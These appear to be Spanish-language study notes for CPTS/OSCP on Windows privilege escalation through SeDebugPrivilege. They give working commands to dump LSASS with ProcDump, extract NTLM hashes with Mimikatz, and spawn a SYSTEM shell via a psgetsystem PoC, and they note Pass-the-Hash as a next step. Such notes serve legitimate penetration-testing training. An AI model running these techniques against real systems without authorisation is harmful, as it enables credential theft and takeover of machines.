
## 1. Enumerar SeDebugPrivilege

`SeDebugPrivilege` permite depurar procesos y acceder a componentes del sistema que normalmente requieren permisos elevados.

Aunque normalmente pertenece a administradores, también puede asignarse a usuarios específicos mediante GPO.

### Comprobar privilegios

```
whoami /priv
```

**Resultado interesante:**

```
SeDebugPrivilege    Debug programs    Disabled
```

> Que aparezca como `Disabled` no significa que el usuario no tenga asignado el privilegio. Puede estar presente en el token, pero deshabilitado en ese momento.

Si encontramos este privilegio, existen dos posibles vías de escalada:

- Extraer credenciales de procesos privilegiados.
    
- Crear procesos utilizando el contexto de seguridad de un proceso SYSTEM.

## 2. Volcado de LSASS con ProcDump

LSASS (`lsass.exe`) gestiona información relacionada con la autenticación de Windows.

Si disponemos de los permisos necesarios, podemos realizar un volcado de su memoria para analizar las credenciales presentes.

### Crear un dump

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**Parámetros:**

|Parámetro|Función|
|---|---|
|`-accepteula`|Acepta la licencia de Sysinternals.|
|`-ma`|Genera un volcado completo de memoria.|
|`lsass.exe`|Proceso objetivo.|
|`lsass.dmp`|Archivo de salida.|

**Resultado esperado:**

```
Dump 1 initiated: lsass.dmp
Dump 1 complete
```

### Alternativa: Administrador de tareas

Si tenemos acceso RDP y permisos suficientes:

1. Abrir el Administrador de tareas.
    
2. Ir a **Detalles**.
    
3. Buscar `lsass.exe`.
    
4. Clic derecho → **Crear archivo de volcado**.
    

Esto permite obtener el dump sin utilizar ProcDump.

## 3. Analizar el dump con Mimikatz

Una vez obtenido el archivo `lsass.dmp`, podemos analizarlo con Mimikatz.

### Iniciar Mimikatz

```
mimikatz.exe
```

### Guardar la salida en un archivo

```
log
```

Esto crea el archivo:

```
mimikatz.log
```

### Cargar el dump

```
sekurlsa::minidump lsass.dmp
```

### Enumerar credenciales

```
sekurlsa::logonpasswords
```

**Información que podemos encontrar:**

- Nombre de usuario.
    
- Dominio.
    
- SID.
    
- Hash NTLM.
    
- Hash SHA1.
    
- Información de sesiones de autenticación.
    

**Ejemplo del módulo:**

```
User Name : jordan
Domain    : WINLPE-SRV01
NTLM      : cf3a5525ee9414229e66279623ed5c58
```

Si recuperamos el hash NTLM de una cuenta privilegiada, podría utilizarse para realizar Pass-the-Hash contra sistemas donde esa cuenta tenga acceso.

## 4. Escalada a SYSTEM mediante procesos padre

Otra posibilidad es aprovechar `SeDebugPrivilege` para crear un proceso hijo utilizando como referencia un proceso que se ejecuta como `NT AUTHORITY\SYSTEM`.

El módulo utiliza una PoC llamada **psgetsystem**.

### Enumerar procesos

```
tasklist
```

También podemos utilizar PowerShell:

```
Get-Process
```

### Identificar procesos SYSTEM

Un ejemplo es:

```
Image Name      PID
winlogon.exe    612
```

`winlogon.exe` normalmente se ejecuta como SYSTEM.

### Ejecutar la PoC

El módulo muestra la siguiente sintaxis:

```
[MyProcess]::CreateProcessFromParent(<SYSTEM_PID>,<COMMAND>,"")
```

**Parámetros:**

|Parámetro|Función|
|---|---|
|`<SYSTEM_PID>`|PID de un proceso que se ejecuta como SYSTEM.|
|`<COMMAND>`|Comando que queremos ejecutar.|
|`""`|Tercer argumento vacío requerido por esa versión de la PoC.|

**Ejemplo:**

```
[MyProcess]::CreateProcessFromParent(612,"cmd.exe","")
```

Si la técnica funciona, se iniciará una consola con privilegios de SYSTEM.

**Comprobar:**

```
whoami
```

**Resultado esperado:**

```
nt authority\system
```

> La PoC ha recibido actualizaciones. La sintaxis mostrada corresponde al ejemplo del módulo y puede diferir de la versión actual.

## 5. Checklist para CPTS/OSCP

### Paso 1 — Enumerar privilegios

```
whoami /priv
```

Buscar:

```
SeDebugPrivilege
```

### Paso 2 — Enumerar procesos

```
tasklist
```

```
Get-Process
```

### Paso 3 — Identificar posibles vías

|Situación|Técnica|
|---|---|
|SeDebugPrivilege disponible|Investigar acceso a procesos privilegiados.|
|LSASS accesible|Volcado y análisis de memoria.|
|Credenciales recuperadas|Posible movimiento lateral.|
|Proceso SYSTEM accesible|Creación de procesos mediante una PoC compatible.|

### Paso 4 — Confirmar privilegios

```
whoami
```

**Objetivo:**

```
nt authority\system
```

## 6. Resumen de comandos

|Comando|Función|
|---|---|
|`whoami /priv`|Enumerar privilegios del usuario.|
|`tasklist`|Listar procesos y PID.|
|`Get-Process`|Enumerar procesos desde PowerShell.|
|`procdump.exe -accepteula -ma lsass.exe lsass.dmp`|Crear un volcado de LSASS.|
|`mimikatz.exe`|Iniciar Mimikatz.|
|`log`|Guardar la salida de Mimikatz.|
|`sekurlsa::minidump lsass.dmp`|Cargar un dump de memoria.|
|`sekurlsa::logonpasswords`|Enumerar credenciales del dump.|
|`[MyProcess]::CreateProcessFromParent(...)`|Crear un proceso desde otro proceso padre mediante la PoC.|

## 7. Cadena de explotación

**Opción 1 — Extracción de credenciales**

```
Usuario con SeDebugPrivilege
          ↓
     ProcDump
          ↓
      lsass.dmp
          ↓
      Mimikatz
          ↓
   Credenciales / NTLM
          ↓
  Posible Pass-the-Hash
```

**Opción 2 — Escalada directa**

```
Usuario con SeDebugPrivilege
          ↓
  Enumerar procesos SYSTEM
          ↓
   Identificar PID
          ↓
      psgetsystem
          ↓
 NT AUTHORITY\SYSTEM
```

**Punto clave:** `SeDebugPrivilege` es un privilegio muy interesante durante una escalada local. Si está disponible y podemos utilizarlo, puede permitir acceder a información sensible de procesos privilegiados o conseguir ejecución como SYSTEM.
